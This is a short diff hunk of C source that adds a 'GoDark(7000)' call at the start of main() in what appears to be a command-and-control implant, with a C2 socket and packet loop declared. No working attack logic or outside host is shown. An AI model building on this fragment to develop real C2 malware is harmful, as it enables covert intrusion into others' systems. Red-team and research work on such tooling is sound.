@@ -15,6 +15,7 @@
 */
 
 int main() {
+    GoDark(7000);
     SOCKET c2Socket;
     PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
     BOOL loop = 1;
